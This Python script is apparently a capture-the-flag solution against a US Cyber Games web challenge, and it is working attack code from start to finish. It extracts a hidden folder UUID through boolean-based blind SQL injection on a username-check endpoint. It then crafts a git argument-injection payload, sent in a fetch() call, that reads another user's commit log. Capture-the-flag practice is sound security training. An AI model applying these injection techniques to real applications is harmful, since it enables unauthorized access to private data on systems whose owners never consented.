# Necessary to perform the HTTP requests required to exploit
from requests import get, post
# Necessary to URL encode the SQL injection payload
from urllib.parse import quote_plus as urlencode
# Helps craft the payload to exploit git
from json import dumps
# Stores the necessary character set
import string

# Our host to exploit here
host = "https://jfoubfoe.web.ctf.uscybergames.com/"

# Generates a SQL injection payload for the host
def gen_payload(payload):
    return host + "api/username_check?username=" + urlencode("admin' and " + payload + " and '1'='1")

# Generates a specific payload to compare a character of the folder with a guess character
def gen_substr(idx, char):
    return gen_payload("substr(folder, " + str(idx) + ", 1) = '" + char + "'")

# Performs a GET request with the substring payload
def run_substr(idx, char):
    return get(gen_substr(idx, char)).json()

# Our charset (since it is a UUID)
charset = string.hexdigits + "-"

# Checks an individual index of the folder 
def check_idx(idx):
    # Loop through our charset for each possible guess
    for char in charset:
        # Perform the GET request
        res = run_substr(idx, char)
        # If "good" is "false", it means there is a row and the character matches
        if not res["good"]:
            return char
    # Return an empty string if all characters exhausted (end of folder name)
    return ""

# Stores the folder
folder = ""
# Initialize our guess character
char = "a"
# Start at index 1 (first character in SQL)
i = 1
# Loop while we have a next character
while len(char) > 0:
    # Get the character
    char = check_idx(i)
    # Go to next index after this
    i += 1
    # Add character to known folder name
    folder += char
    # Print progress
    print(folder)

# Action necessary to view the log
action = "-C ../" + folder + " log -- scratchpad.txt --"
# Just a random hash value to complete the request payload
hash_val = "test"
# Create the payload as JSON
body_payload = dumps({"action":action,"hash":hash_val})
# String with fetch payload
full_fetch = "fetch(\"" + host + "api/revision\", {method:\"POST\",body:'"+body_payload+"'});"
# Print the payload so we can run it after logging in
print(full_fetch)
